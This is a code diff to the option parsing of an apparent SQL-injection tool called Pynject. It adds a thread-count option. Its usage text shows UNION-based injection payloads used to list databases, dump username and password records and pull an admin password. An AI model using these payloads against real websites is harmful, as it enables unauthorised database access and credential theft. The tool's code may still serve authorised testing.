@@ -450,7 +450,7 @@ if __name__ == '__main__':
         parser = OptionParser( usage = "usage: %prog [options] [action] [output method]\n\n" +
                                        "EXAMPLES:\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --dbs\n" +
-                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop --tables\n" +
+                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop --tables --threads 50\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users --columns\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users -F 'username,password' --records --start 0 --end 100\n\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --query 'SELECT password FROM shop.users WHERE username='admin' LIMIT 0,1'\n\n" )
@@ -461,6 +461,7 @@ if __name__ == '__main__':
         parser.add_option( "-v", "--verbose",  action="store_true",  dest="verbose",  default=False,   help="Make Pynject prints fetched data at runtime.")
         parser.add_option( "-s", "--start",    action="store",       dest="start",    default=0,       help="If fetching records, start from this index.")
         parser.add_option( "-e", "--end",      action="store",       dest="end",      default=-1,      help="If fetching records, end at this index.")
+        parser.add_option( "-t", "--threads",  action="store",       dest="threads",  default=30,      help="Set maximum number of running threads (default 30)." )
         parser.add_option( "-D", "--database", action="store",       dest="database", default=None,    help="Database name to use.")
         parser.add_option( "-T", "--table",    action="store",       dest="table",    default=None,    help="Table name to use.")
         parser.add_option( "-F", "--fields",   action="store",       dest="fields",   default=None,    help="Comma separated values of fields to use.")
@@ -498,7 +499,7 @@ if __name__ == '__main__':
         elif o.end != -1 and o.end < o.start:
             parser.error( "End index can't be smaller than start index." )
 
-        pynject = Pynject( url = o.url, marker = o.marker, comment = o.comment, verbose = o.verbose )
+        pynject = Pynject( url = o.url, marker = o.marker, comment = o.comment, max_threads = int(o.threads), verbose = o.verbose )
 
         if o.action == "dbs":
             pynject.fetchDatabases()
